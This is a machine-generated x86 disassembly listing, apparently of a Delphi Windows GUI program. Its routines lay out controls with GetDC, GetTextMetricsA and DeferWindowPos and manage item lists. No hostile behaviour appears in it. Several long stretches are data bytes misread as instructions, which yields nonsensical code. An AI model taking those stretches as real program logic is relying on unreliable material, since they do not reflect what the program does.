push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_4141dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43cba8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42b110
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42b175
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434130
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42b17a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a544
call sub_4039a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b1a0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_43fd3c
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403394
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42b1e0
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43fb84
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403394
pop edx
pop esi
pop ebx
retn
sub_42b20c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4329ec
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42b4bc
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42b29c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42b530
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403198
mov eax [ esi + 0x210 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42b2ec
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41ce38
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42b475
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_440d58
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43a490
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_439f74
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_414098
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403394
test al al
je r-xdata
sub_42b484
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4140f4
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43a17c
mov eax ebx
mov si 0xffeb
call sub_403394
sub_42b4bc
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42b634
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42b530
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b054
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_414180
call sub_403198
pop edi
pop esi
pop ebx
retn
sub_42b570
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42b2ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b5a8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_414098
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_414098
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42b634
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b6fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42b530
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42b2ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b704
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_414098
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_414098
pop edx
call sub_43a5a0
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42b70c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_440244
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_414098
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42b780
salc
inc edi
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] ch
salc
inc edi
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] dl
salc
inc edi
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] bl
salc
inc edi
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] al
salc
inc edi
add [ esi ] al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
salc
inc edi
add [ 0x640000ff ] cl
salc
inc edi
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax - 0xfffb847 ] al
mov eax 0xb9780042
inc edi
add al ch
mov eax 0xb9700042
inc edi
add al ah
mov eax 0xb9680042
inc edi
add al bl
mov eax 0xb9600042
inc edi
add al dl
mov eax 0xb9580042
inc edi
add al cl
mov eax 0xb9500042
inc edi
add al al
mov eax 0xb9480042
inc edi
add [ eax + 0x400042b8 ] bh
mov ecx 0xb8b00047
inc edx
add [ eax ] bh
mov ecx 0xb8a80047
inc edx
add [ eax ] dh
mov ecx 0xb8a00047
inc edx
add [ eax ] ch
mov ecx 0xb8980047
inc edx
add [ eax ] ah
mov ecx 0xb8900047
inc edx
add [ eax ] bl
mov ecx 0xb8880047
inc edx
add [ eax ] dl
mov ecx 0xb8800047
inc edx
add [ eax ] cl
mov ecx 0xb8780047
inc edx
add [ eax ] al
mov ecx 0xb8700047
inc edx
add al bh
mov eax 0xb8680047
inc edx
add al dh
mov eax 0xb8600047
inc edx
add al ch
mov eax 0xb8580047
inc edx
add al ah
mov eax 0xb8500047
inc edx
add al bl
mov eax 0xb8480047
inc edx
add al dl
mov eax 0xb8400047
inc edx
add al cl
mov eax 0xb8380047
inc edx
add al al
mov eax 0xb8300047
inc edx
add [ eax + 0x280047b8 ] bh
mov eax 0xb8b00042
inc edi
add [ eax ] ah
mov eax 0xb8a80042
inc edi
add [ eax ] bl
mov eax 0xb8a00042
inc edi
add [ eax ] dl
mov eax 0xb8980042
inc edi
add [ eax ] cl
mov eax 0xb8900042
inc edi
add [ eax ] al
mov eax 0xb8880042
inc edi
add al bh
mov bh 0x42
add [ eax - 0xfffb848 ] al
mov bh 0x42
add [ eax - 0x48 ] bh
inc edi
add al ch
mov bh 0x42
add [ eax - 0x48 ] dh
inc edi
add al ah
mov bh 0x42
add [ eax - 0x48 ] ch
inc edi
add al bl
mov bh 0x42
add [ eax - 0x48 ] ah
inc edi
add al dl
mov bh 0x42
add [ eax - 0x48 ] bl
inc edi
add al cl
mov bh 0x42
add [ eax - 0x48 ] dl
inc edi
add al al
mov bh 0x42
add [ eax - 0x48 ] cl
inc edi
add [ eax + 0x400042b7 ] bh
mov eax 0xb7b00047
inc edx
add [ eax ] bh
mov eax 0xb7a80047
inc edx
add [ eax ] dh
mov eax 0xb7a00047
inc edx
add [ eax ] ch
mov eax 0xb7980047
inc edx
add [ eax ] ah
mov eax 0xb7900047
inc edx
add [ eax ] bl
mov eax 0xb7880047
inc edx
add [ eax ] dl
mov eax 0xb7800047
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42bab0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bab7
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404970
sub_42baec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bb11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb18
retn
sub_42bb24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bb55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb5c
retn
mov eax [ rw-data ]
call sub_403198
sub_42bbf1
mov ebx 0xd030042
push esp
inc edx
jne r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
xor al 0x55
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebp + 0x240042 ] bh
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
mov ebx 0x620b0042
insb
inc edi
insb
jns r-xdata
add [ eax ] dh
mov ebp 0x240042
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ ecx + esi + 0x40 ] cl
add [ edx - 0x2c07ffbf ] ch
inc edx
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
hlt
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ebx
add [ esi + eax * 2 + 0x41 ] dl
inc edx
jne r-xdata
inc ebx
add [ ebx ] dl
inc ecx
add [ eax + 0x64004395 ] al
mov [ 0xffffffffa2f80041 ] al
inc ecx
add [ ebx + 0x41 ] cl
inc ecx
add ah dl
xchg esp eax
je r-xdata
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffd4d80041 ]
inc edx
add ah dh
mov ah 0x43
add al dh
mov ah 0x43
add al al
mov ch 0x43
add [ eax + ebx * 4 - 0x6007ffbd ] dh
inc ebx
add [ edi + ebx * 4 + 0x43 ] bl
add [ eax + ebp * 4 - 0x6803ffbd ] al
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add al dh
mov bh 0x43
add [ eax + ecx * 8 - 0x55bbffbd ] ch
inc ebx
add [ eax + 0x2c0043aa ] bh
fwait
inc ebx
add [ eax - 0x2fffbc56 ] bl
aad 0x42
add [ eax ] dl
add [ ebx ] al
add cl [ eax + esi * 4 ]
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
je r-xdata
add al ah
mov [ 0xffffffff94d40041 ] al
outsb
jae r-xdata
add [ eax - 0x5d ] bl
add [ edx + ebx * 8 + 0x42 ] ch
add [ eax - 0x66 ] al
inc ebx
add [ ecx + ebx * 4 - 0x5ca7ffbd ] ch
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42bd9490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42be ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 ] ah
inc edx
add [ esi - 0x7bffbd42 ] al
add [ eax ] eax
add ah dh
imul eax [ ebx ] sub_41a1c0
in al dx
xor eax [ eax ]
adc al 0x9b
inc ecx
add ah dh
xor eax [ eax ]
test [ ecx + 0x31300043 ] bh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x640042d5 ] bl
mov [ ebx ] 0x5c
mov edx 0x46540043
inc ecx
adc [ eax - 0x1c ] ch
mov ebx 0xe9c30042
or bh [ ebp - 0x3 ]
rcl [ eax - 0x44 ] 0x42
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
add al al
xchg ebx eax
inc ebx
add [ esp + edx * 8 ] bl
inc edx
add [ esp + edx * 4 ] dh
inc ebx
add [ eax - 0x2c ] ch
inc edx
add al dh
push 0x44
add [ ebp + edx * 4 - 0x6b97ffbd ] ch
inc ebx
add [ ebx + ebp * 2 ] ch
inc esp
add [ eax + 0x6b ] al
inc esp
add [ eax + 0x68004394 ] ah
imul eax [ eax + eax - 0x4 ] 0xffffff94
inc ebx
add [ eax + 0x1c0042d4 ] bl
xchg ebp eax
inc ebx
add [ eax + 0x300042d4 ] bh
xchg esi eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax - 0x6a ] dl
inc ebx
add [ edx * 4 + 0x6b8c0043 ] bh
inc esp
add [ eax + 0x6000446b ] dl
xchg ebp eax
inc ebx
add al dl
xchg edx eax
inc ebx
add [ esi ] dl
push esp
push ebx
jo r-xdata
inc ecx
add al bh
mov [ 0xffffffffa34c0041 ] al
inc ecx
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
mov ah 0xbc
inc edx
sub_42c29c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bl al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
retn
sub_42c3b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
retn
sub_42c40c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_447544
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42c460
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_447598
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42c490
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_4145b0
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41456c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4479cc
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_4144c8
sub_42c4dc
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42c490
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_447bd8
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42c508
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_414598
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41456c
sub_42c538
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42c57c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42c5ac
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c40c
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413eec
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414098
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42c60c
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_4141dc
mov eax ebx
call sub_403198
sub_42c63c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42c770
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_4034bc
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c538
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42c6d0
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403198
mov eax esi
call sub_42c72c
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42c630
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
mov eax [ rw-data ]
call sub_403198
xor eax eax
mov [ rw-data ] eax
sub_42c72c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42c508
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42c60c
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42c770
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_422594
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_42c72c
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42c7a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42c72c
mov edx ebx
mov eax [ esi + 0x4 ]
